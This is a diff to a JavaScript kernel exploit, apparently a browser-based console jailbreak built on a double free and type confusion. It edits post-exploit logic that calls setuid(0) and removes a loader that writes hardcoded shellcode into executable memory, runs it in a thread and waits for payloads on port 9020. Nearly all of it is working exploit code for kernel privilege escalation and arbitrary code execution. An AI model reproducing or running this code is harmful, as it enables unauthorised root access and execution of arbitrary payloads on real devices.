@@ -1594,9 +1594,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-    localStorage.ExploitLoaded="yes"
-    sessionStorage.ExploitLoaded="yes"
-    //alert("kernel exploit succeeded!");
+    alert("kernel exploit succeeded!");
 }
 
 
@@ -1644,64 +1642,6 @@ function setup(block_fd) {
     return [block_id, groom_ids];
 }
 
-function malloc(sz) {
-        var backing = new Uint8Array(0x10000 + sz);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-    function malloc32(sz) {
-        var backing = new Uint8Array(0x10000 + sz * 4);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = new Uint32Array(backing.buffer);
-        return ptr;
-    }
-
-function runBinLoader() {
-    var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
-    var payload_loader = malloc32(0x1000);
-    var BLDR = payload_loader.backing;
-    BLDR[0]  = 0x56415741;  BLDR[1]  = 0x83485541;  BLDR[2]  = 0x894818EC;
-    BLDR[3]  = 0xC748243C;  BLDR[4]  = 0x10082444;  BLDR[5]  = 0x483C2302;
-    BLDR[6]  = 0x102444C7;  BLDR[7]  = 0x00000000;  BLDR[8]  = 0x000002BF;
-    BLDR[9]  = 0x0001BE00;  BLDR[10] = 0xD2310000;  BLDR[11] = 0x00009CE8;
-    BLDR[12] = 0xC7894100;  BLDR[13] = 0x8D48C789;  BLDR[14] = 0xBA082474;
-    BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8;  BLDR[17] = 0xFF894400;
-    BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800;  BLDR[20] = 0x89440000;
-    BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2;  BLDR[23] = 0x89410000;
-    BLDR[24] = 0x2C8B4CC6;  BLDR[25] = 0x45C64124;  BLDR[26] = 0x05EBC300;
-    BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
-    BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
-    BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
-    BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
-    BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
-    BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
-    BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
-    BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
-    BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
-    BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
-    BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
-    BLDR[60] = 0xC3050FCA;
-
-    chain.sys('mprotect', payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
-
-    var pthread = malloc(0x10);
-    sysi('mlock', payload_buffer, 0x300000);
-
-    call_nze(
-        'pthread_create',
-        pthread,
-        0,
-        payload_loader,
-        payload_buffer
-    );
-
-    log('GoldHEN Already Loaded, BinLoader Is Ready. Send A Payload To Port 9020 Now');
-}
-
 // overview:
 // * double free a aio_entry (resides at a 0x80 malloc zone)
 // * type confuse a evf and a ip6_rthdr
@@ -1718,16 +1658,14 @@ export async function kexploit() {
     await init();
     const _init_t2 = performance.now();
 
+    // If setuid is successful, we dont need to run the kexploit again
     try {
-       chain.sys('setuid', 0);
-    } catch (e) {
-        localStorage.ExploitLoaded = "no";
+        if (sysi('setuid', 0) == 0) {
+            log("Not running kexploit again.")
+            return;
+        }
     }
-    
-    if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
-            runBinLoader();
-            return new Promise(() => {});
-    }
+    catch (e) {}
 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
@@ -1804,6 +1742,22 @@ export async function kexploit() {
     }
 }
 
+function malloc(sz) {
+        var backing = new Uint8Array(0x10000 + sz);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
+
+    function malloc32(sz) {
+        var backing = new Uint8Array(0x10000 + sz * 4);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = new Uint32Array(backing.buffer);
+        return ptr;
+    }
+
 
 kexploit().then(() => {
     
@@ -1827,5 +1781,9 @@ kexploit().then(() => {
         payload_loader,
         payload_buffer,
     );
+
+
+    
+
 
 })
